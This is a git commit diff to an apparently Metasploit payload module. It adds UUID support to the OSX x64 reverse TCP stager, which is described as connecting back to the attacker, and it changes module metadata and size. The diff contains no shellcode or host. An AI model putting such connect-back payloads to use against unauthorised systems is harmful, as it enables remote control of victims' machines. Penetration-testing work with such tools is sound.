9f740bca74a26ba5d4a74d864000a168e1cad87a
Tim W <timrlw@gmail.com>
2020-04-14 14:18:21 +0800

    fix #12837, add support for osx reverse_tcp_uuid

--- modules/payloads/stagers/osx/x64/reverse_tcp_uuid.rb
+++ modules/payloads/stagers/osx/x64/reverse_tcp_uuid.rb
@@ -8,23 +8,31 @@ require 'msf/core/payload/osx/x64/reverse_tcp'
 
 module MetasploitModule
 
-  CachedSize = 168
+  CachedSize = 209
 
   include Msf::Payload::Osx::ReverseTcp_x64
   include Msf::Payload::TransportConfig
   include Msf::Payload::Stager
 
+  def self.handler_type_alias
+    'reverse_tcp_uuid'
+  end
+
   def initialize(info = { })
     super(merge_info(info,
-      'Name'        => 'Reverse TCP Stager',
-      'Description' => 'Connect, read length, read buffer, execute',
-      'Author'      => 'nemo <nemo[at]felinemenace.org>',
+      'Name'        => 'Reverse TCP Stager with UUID Support (OSX x64)',
+      'Description' => 'Connect back to the attacker with UUID Support (OSX x64)',
+      'Author'      => 'timwr',
       'License'     => MSF_LICENSE,
       'Platform'    => 'osx',
       'Arch'        => ARCH_X64,
       'Handler'     => Msf::Handler::ReverseTcp,
       'Convention'  => 'sockedi',
     ))
+  end
+
+  def include_send_uuid
+    true
   end
 
   def generate(opts = {})
